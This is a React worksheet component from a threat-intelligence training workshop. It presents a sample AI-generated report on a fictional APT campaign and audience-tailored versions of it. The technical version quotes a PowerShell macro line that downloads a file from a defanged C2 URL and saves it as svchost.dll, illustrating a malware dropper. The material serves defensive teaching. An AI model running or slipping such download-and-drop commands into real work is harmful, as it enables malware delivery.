import React, { useState, useEffect } from 'react';
import { Container, Card, Form, Button, Row, Col, Tab, Nav, Badge } from 'react-bootstrap';
import { useNavigate, Link } from 'react-router-dom';
import { useWorkshop } from '../context/WorkshopContext';

const Worksheet6 = () => {
  const navigate = useNavigate();
  const { 
    reportGeneration, 
    setReportGeneration,
    worksheetProgress,
    setWorksheetProgress
  } = useWorkshop();
  
  const [currentStep, setCurrentStep] = useState(1);
  
  // Sample AI-generated threat report
  const sampleAiReport = `# Threat Intelligence Report: APT-X Campaign Analysis
## Executive Summary
APT-X (also known as JADE TEMPEST) has been observed conducting a targeted campaign against organizations in the financial sector during the past 30 days. The threat actor is utilizing a combination of spear-phishing emails and exploitation of VPN vulnerabilities to gain initial access. Their primary objective appears to be data exfiltration focusing on financial records and customer information.

## Key Findings
- Initial access is predominantly achieved through spear-phishing emails containing malicious Excel documents that exploit CVE-2023-XXXX
- The actor has demonstrated the capability to move laterally using stolen credentials and exploiting unpatched systems
- Exfiltration occurs through encrypted channels to attacker-controlled servers in Eastern Europe
- The campaign shows significant overlap with previously documented APT-X activities from 2022

## Technical Details
The malicious Excel documents contain embedded macros that, when executed, drop a first-stage loader that establishes persistence through a scheduled task. The loader then retrieves a more sophisticated second-stage implant from a compromised legitimate website serving as a command and control (C2) server.

### Indicators of Compromise (IOCs)
- Hash: e1d8d15b6a71be5c225ae9a1617d253f2c2ef176d7505bffc23d18cd32e1aadc
- C2 Domains: update-service[.]nexuspath[.]org, cdn-storage[.]cloudprovider[.]biz
- IP Addresses: 45.77.X.X, 194.5.X.X
- URL Patterns: /api/v3/update.php?id=[base64 string]

## Recommendations
1. Implement email filtering to detect messages containing Excel attachments from external sources
2. Update VPN appliances to the latest patch levels, particularly focusing on CVE-2023-XXXX
3. Deploy detection rules for the identified IOCs (provided separately)
4. Conduct threat hunting for potential compromise using the TTPs described in this report`;

  // Sample target audience options
  const audienceOptions = [
    { value: 'technical', label: 'Technical Teams (SOC, IT Security)' },
    { value: 'management', label: 'Security Management' },
    { value: 'executive', label: 'Executive Leadership' },
    { value: 'business', label: 'Business Units' }
  ];
  
  // Calculate progress
  useEffect(() => {
    let progress = 0;
    
    // Check for AI-generated report content
    if (reportGeneration.aiGeneratedReport || sampleAiReport) {
      progress += 25;
    }
    
    // Check target audience
    if (reportGeneration.targetAudience) {
      progress += 25;
    }
    
    // Check user refinements
    if (reportGeneration.userRefinements && reportGeneration.userRefinements.length > 10) {
      progress += 25;
    }
    
    // Check final report
    if (reportGeneration.finalReport && reportGeneration.finalReport.length > 10) {
      progress += 25;
    }
    
    setWorksheetProgress({
      ...worksheetProgress,
      worksheet6: progress
    });
  }, [reportGeneration, worksheetProgress, setWorksheetProgress]);
  
  // Handle target audience selection
  const handleAudienceChange = (e) => {
    setReportGeneration({
      ...reportGeneration,
      targetAudience: e.target.value
    });
  };
  
  // Handle user refinements input
  const handleRefinementsChange = (e) => {
    setReportGeneration({
      ...reportGeneration,
      userRefinements: e.target.value
    });
  };
  
  // Handle final report input
  const handleFinalReportChange = (e) => {
    setReportGeneration({
      ...reportGeneration,
      finalReport: e.target.value
    });
  };
  
  // Handle next step
  const handleNextStep = () => {
    if (currentStep < 3) {
      if (currentStep === 1 && !reportGeneration.aiGeneratedReport) {
        // Save the AI-generated report if moving from step 1
        setReportGeneration({
          ...reportGeneration,
          aiGeneratedReport: sampleAiReport
        });
      }
      setCurrentStep(currentStep + 1);
    } else {
      navigate('/results');
    }
  };
  
  // Handle previous step
  const handlePrevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    } else {
      navigate('/worksheet-5');
    }
  };
  
  // Generate audience-specific reports
  const getAudienceSpecificReport = () => {
    const audience = reportGeneration.targetAudience;
    
    if (audience === 'technical') {
      return `# Technical Threat Intelligence Report: APT-X Campaign
## Overview
A sophisticated threat actor, APT-X (JADE TEMPEST), is actively targeting financial sector organizations using spear-phishing with malicious Excel files exploiting CVE-2023-XXXX and vulnerable VPN appliances.

## TTPs (MITRE ATT&CK)
- Initial Access: Spear-phishing Attachment (T1566.001), Exploit Public-Facing Application (T1190)
- Execution: User Execution: Malicious Office Document (T1204.002)
- Persistence: Scheduled Task (T1053.005)
- Defense Evasion: Obfuscated Files (T1027)
- Command and Control: Web Protocols (T1071.001), Encrypted Channel (T1573)
- Exfiltration: Exfiltration Over C2 Channel (T1041)

## Technical Details
The Excel document contains a macro that executes PowerShell code:
\`\`\`
$url = "hxxp://update-service.nexuspath[.]org/api/v3/update.php"
$outpath = "$env:TEMP\\svchost.dll"
Invoke-WebRequest -Uri $url -OutFile $outpath
...
\`\`\`

### IOCs for Immediate Implementation
- SHA-256: e1d8d15b6a71be5c225ae9a1617d253f2c2ef176d7505bffc23d18cd32e1aadc
- Domains: update-service[.]nexuspath[.]org, cdn-storage[.]cloudprovider[.]biz
- IPs: 45.77.X.X, 194.5.X.X
- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) MSIE 11.0 AppleWebKit/537.36

## Detection and Mitigation
See attached YARA and Sigma rules for immediate implementation across your environment. Focus on host-based detection of Excel macro execution patterns and network detection of the identified C2 communication.`;
    } 
    else if (audience === 'management') {
      return `# Security Management Briefing: APT-X Campaign
## Summary
We have identified an active targeted campaign against financial sector organizations by APT-X (JADE TEMPEST). This actor is known to be sophisticated and persistent, with potential links to financially motivated state-sponsored activities.

## Key Impacts and Risks
- Potential data breach of customer financial records
- Regulatory reporting obligations if customer data is compromised
- Operational disruption during remediation efforts
- Reputational damage if attack is publicly disclosed

## Current Status
- No evidence of compromise in our environment yet detected
- Proactive blocking of identified indicators implemented
- Vulnerability scanning for affected VPN systems in progress
- Enhanced monitoring deployed for related TTPs

## Resource Requirements
- SOC team time allocation for threat hunting (est. 24 person-hours)
- System patching window for VPN infrastructure (4-hour maintenance window)
- Security awareness reinforcement for finance department personnel

## Recommended Actions
1. Accelerate patch deployment for the affected VPN vulnerabilities
2. Implement stricter email filtering rules for high-risk departments
3. Conduct targeted threat hunting exercises using provided IOCs
4. Review and update incident response playbooks for this specific threat

## Timeline
- Immediate: Deploy detection rules and email filtering
- 24-48 hours: Complete VPN patching and initial threat hunting
- 1 week: Comprehensive threat hunting and security posture assessment`;
    } 
    else if (audience === 'executive') {
      return `# Executive Intelligence Briefing: APT-X Campaign
## Business Impact Summary
A sophisticated threat group (APT-X) is actively targeting financial organizations with the goal of stealing sensitive financial data and customer information. This represents a high-risk threat to our business operations, regulatory compliance, and reputation.

## Key Risk Points
- **Data Protection**: Customer financial records at risk
- **Regulatory**: Potential reporting obligations
- **Financial**: Costs associated with incident response
- **Reputation**: Public trust impact if breach occurs

## Current Protection Status
✅ Proactive defensive measures implemented
✅ Technical teams actively hunting for indicators
✅ Critical system patching expedited
✅ Enhanced monitoring in place

## Executive Actions Requested
1. Approve emergency maintenance window for security patching
2. Support enhanced security awareness communications to staff
3. Review business continuity preparations should incident response be necessary

No compromise has been detected in our environment at this time. This is a proactive security response to an identified threat.`;
    }
    else if (audience === 'business') {
      return `# Business Unit Advisory: Increased Phishing Threat
## What's Happening
Our security team has identified a targeted email campaign specifically crafted to trick employees in financial organizations into opening malicious attachments. These emails may appear highly convincing and relevant to your daily work.

## How It Affects You
- Emails may contain Excel files claiming to be financial reports, invoices, or account statements
- The emails may appear to come from legitimate business partners, clients, or even colleagues
- If opened and enabled, these documents can compromise your computer and potentially access sensitive information

## What You Should Do
- Be especially vigilant with unexpected emails containing attachments
- Verify the sender through alternate means before opening attachments
- Report suspicious emails to the security team immediately
- Do not forward suspicious emails to colleagues

## Example Red Flags
- Urgent requests for action involving financial documents
- Minor spelling errors or unusual phrasing in emails
- Pressure tactics or threats about account access or deadlines
- Requests to enable macros or special content in documents

The security team is available to help verify any suspicious communications. When in doubt, please reach out to us at [security@company.com].`;
    }
    else {
      return sampleAiReport;
    }
  };
  
  return (
    <Container className="py-4">
      <Row className="justify-content-center">
        <Col lg={10}>
          <Card className="shadow-sm">
            <Card.Header className="bg-gradient" style={{ background: 'var(--cyware-gradient)' }}>
              <h4 className="mb-0 text-white">Exercise 6: Reporting & Knowledge Sharing</h4>
              <div className="text-white-50 small">Leveraging GenAI for enhanced threat intelligence reporting</div>
            </Card.Header>
            <Card.Body className="p-4">
              
              {currentStep === 1 && (
                <div>
                  <h5 className="mb-3">Step 1: AI-Generated Threat Report</h5>
                  
                  <div className="bg-light p-3 mb-4 rounded">
                    <div className="d-flex align-items-center mb-3">
                      <div className="me-3 p-2 rounded-circle" style={{ background: 'rgba(13, 110, 253, 0.1)' }}>
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#0d6efd" strokeWidth="2" />
                          <path d="M12 16V12" stroke="#0d6efd" strokeWidth="2" strokeLinecap="round" />
                          <path d="M12 8H12.01" stroke="#0d6efd" strokeWidth="2" strokeLinecap="round" />
                        </svg>
                      </div>
                      <div>
                        <h6 className="mb-1">AI Assistant Analysis</h6>
                        <p className="mb-0 text-muted">
                          Based on the threat intelligence we've gathered and analyzed throughout this workshop, I've generated a comprehensive threat report. This AI-generated report can serve as a starting point that you can refine and customize.
                        </p>
                      </div>
                    </div>
                  </div>
                  
                  <div className="bg-light border rounded p-3 mb-4" style={{ maxHeight: '500px', overflow: 'auto' }}>
                    <pre className="mb-0" style={{ whiteSpace: 'pre-wrap', fontFamily: 'inherit' }}>
                      {sampleAiReport}
                    </pre>
                  </div>
                  
                  <div className="alert alert-info d-flex align-items-center">
                    <svg width="24" height="24" className="me-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" strokeWidth="2" />
                      <path d="M12 16V12" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
                      <path d="M12 8H12.01" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
                    </svg>
                    <div>
                      Review this AI-generated report. In the next steps, you'll select a target audience and refine the report accordingly.
                    </div>
                  </div>
                </div>
              )}
              
              {currentStep === 2 && (
                <div>
                  <h5 className="mb-3">Step 2: Audience-Tailored Reporting</h5>
                  
                  <div className="bg-light p-3 mb-4 rounded">
                    <div className="d-flex align-items-center mb-3">
                      <div className="me-3 p-2 rounded-circle" style={{ background: 'rgba(13, 110, 253, 0.1)' }}>
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#0d6efd" strokeWidth="2" />
                          <path d="M12 16V12" stroke="#0d6efd" strokeWidth="2" strokeLinecap="round" />
                          <path d="M12 8H12.01" stroke="#0d6efd" strokeWidth="2" strokeLinecap="round" />
                        </svg>
                      </div>
                      <div>
                        <h6 className="mb-1">Effective Knowledge Sharing</h6>
                        <p className="mb-0 text-muted">
                          Different stakeholders need different levels of detail and focus areas. Select a target audience, and the AI will adjust the report content and format accordingly.
                        </p>
                      </div>
                    </div>
                  </div>
                  
                  <Form.Group className="mb-4">
                    <Form.Label><strong>Select Target Audience</strong></Form.Label>
                    <Form.Select 
                      value={reportGeneration.targetAudience || ''}
                      onChange={handleAudienceChange}
                    >
                      <option value="">Select an audience...</option>
                      {audienceOptions.map(option => (
                        <option key={option.value} value={option.value}>
                          {option.label}
                        </option>
                      ))}
                    </Form.Select>
                  </Form.Group>
                  
                  {reportGeneration.targetAudience && (
                    <div className="mb-4">
                      <h6 className="mb-2">AI-Generated Report for {audienceOptions.find(o => o.value === reportGeneration.targetAudience)?.label}</h6>
                      <div className="bg-light border rounded p-3" style={{ maxHeight: '400px', overflow: 'auto' }}>
                        <pre className="mb-0" style={{ whiteSpace: 'pre-wrap', fontFamily: 'inherit' }}>
                          {getAudienceSpecificReport()}
                        </pre>
                      </div>
                    </div>
                  )}
                  
                  <Form.Group className="mb-4">
                    <Form.Label><strong>Your Refinements and Feedback</strong></Form.Label>
                    <Form.Control 
                      as="textarea"
                      rows={4}
                      value={reportGeneration.userRefinements || ''}
                      onChange={handleRefinementsChange}
                      placeholder="What improvements would you make to this report? Are there additional details or context that should be included or removed?"
                    />
                  </Form.Group>
                </div>
              )}
              
              {currentStep === 3 && (
                <div>
                  <h5 className="mb-3">Step 3: Human-AI Intelligence Collaboration</h5>
                  
                  <div className="bg-light p-3 mb-4 rounded">
                    <div className="d-flex align-items-center">
                      <div className="me-3 p-2 rounded-circle" style={{ background: 'rgba(13, 110, 253, 0.1)' }}>
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#0d6efd" strokeWidth="2" />
                          <path d="M12 16V12" stroke="#0d6efd" strokeWidth="2" strokeLinecap="round" />
                          <path d="M12 8H12.01" stroke="#0d6efd" strokeWidth="2" strokeLinecap="round" />
                        </svg>
                      </div>
                      <div>
                        <h6 className="mb-1">The Power of Collaboration</h6>
                        <p className="mb-0 text-muted">
                          The most effective intelligence analysis combines AI's data processing capabilities with human expertise, contextual understanding, and critical thinking.
                        </p>
                      </div>
                    </div>
                  </div>
                  
                  <Row className="mb-4">
                    <Col>
                      <Tab.Container defaultActiveKey="human-review">
                        <Row>
                          <Col md={3}>
                            <Nav variant="pills" className="flex-column">
                              <Nav.Item>
                                <Nav.Link eventKey="human-review">Human Review</Nav.Link>
                              </Nav.Item>
                              <Nav.Item>
                                <Nav.Link eventKey="ai-strengths">AI Strengths</Nav.Link>
                              </Nav.Item>
                              <Nav.Item>
                                <Nav.Link eventKey="human-strengths">Human Strengths</Nav.Link>
                              </Nav.Item>
                              <Nav.Item>
                                <Nav.Link eventKey="best-practices">Best Practices</Nav.Link>
                              </Nav.Item>
                            </Nav>
                          </Col>
                          <Col md={9}>
                            <Tab.Content>
                              <Tab.Pane eventKey="human-review">
                                <h6 className="mb-3">Why Human Review Matters</h6>
                                <ul>
                                  <li>Ensuring factual accuracy in AI-generated content</li>
                                  <li>Adding organizational context not available to AI</li>
                                  <li>Validating that actionable recommendations are reasonable and aligned with capabilities</li>
                                  <li>Verifying that the tone and style match organizational standards</li>
                                  <li>Integrating human expertise that may not be represented in training data</li>
                                </ul>
                              </Tab.Pane>
                              <Tab.Pane eventKey="ai-strengths">
                                <h6 className="mb-3">GenAI Strengths in Reporting</h6>
                                <ul>
                                  <li>Processing and synthesizing large volumes of disparate intelligence</li>
                                  <li>Generating comprehensive initial reports quickly</li>
                                  <li>Identifying patterns and connections across multiple sources</li>
                                  <li>Adapting content for different audiences automatically</li>
                                  <li>Maintaining consistency in reporting style and format</li>
                                </ul>
                              </Tab.Pane>
                              <Tab.Pane eventKey="human-strengths">
                                <h6 className="mb-3">Human Analyst Strengths</h6>
                                <ul>
                                  <li>Critical thinking and deep analytical reasoning</li>
                                  <li>Understanding nuanced organizational context and history</li>
                                  <li>Making judgment calls on intelligence reliability and significance</li>
                                  <li>Anticipating strategic implications not explicitly in the data</li>
                                  <li>Bringing specialized domain expertise and experience</li>
                                </ul>
                              </Tab.Pane>
                              <Tab.Pane eventKey="best-practices">
                                <h6 className="mb-3">Best Practices for AI-Enhanced Reporting</h6>
                                <ul>
                                  <li>Use AI to generate initial drafts, not final products</li>
                                  <li>Establish clear verification workflows for AI-generated content</li>
                                  <li>Combine automated tools with human-led quality control</li>
                                  <li>Maintain appropriate attribution for source intelligence</li>
                                  <li>Document both AI and human contributions to final intelligence products</li>
                                </ul>
                              </Tab.Pane>
                            </Tab.Content>
                          </Col>
                        </Row>
                      </Tab.Container>
                    </Col>
                  </Row>
                  
                  <Form.Group className="mb-4">
                    <Form.Label>
                      <strong>What have you learned about the role of GenAI in threat intelligence reporting?</strong>
                    </Form.Label>
                    <Form.Control 
                      as="textarea"
                      rows={4}
                      value={reportGeneration.finalReport || ''}
                      onChange={handleFinalReportChange}
                      placeholder="Reflect on how GenAI can enhance your reporting processes, where human expertise remains essential, and how you might implement AI-assisted reporting in your organization..."
                    />
                  </Form.Group>
                  
                  <div className="alert alert-success">
                    <h6 className="mb-2">Workshop Complete!</h6>
                    <p className="mb-0">
                      You've now completed all six exercises in this workshop on "Taking Action in a Noisy World – A Day in the Life of an Intel Analyst with GenAI Integration." Click "Complete Workshop" to see your results and get a summary of key takeaways.
                    </p>
                  </div>
                </div>
              )}
              
              <div className="d-flex justify-content-between mt-4">
                {currentStep === 1 ? (
                  <Button 
                    variant="secondary" 
                    onClick={() => window.location.href = '/worksheet-5'}
                  >
                    Previous Exercise
                  </Button>
                ) : (
                  <Button variant="secondary" onClick={handlePrevStep}>Previous Step</Button>
                )}
                
                {currentStep === 3 ? (
                  <Button 
                    variant="primary" 
                    onClick={() => window.location.href = '/results'}
                  >
                    Complete Workshop
                  </Button>
                ) : (
                  <Button 
                    variant="primary" 
                    onClick={handleNextStep}
                    disabled={(currentStep === 2 && !reportGeneration.targetAudience)}
                  >
                    Next Step
                  </Button>
                )}
              </div>
            </Card.Body>
            <Card.Footer>
              <div className="d-flex justify-content-between align-items-center">
                <div>Step {currentStep} of 3</div>
                <div>Exercise Progress: {worksheetProgress.worksheet6}%</div>
              </div>
            </Card.Footer>
          </Card>
        </Col>
      </Row>
    </Container>
  );
};

export default Worksheet6;
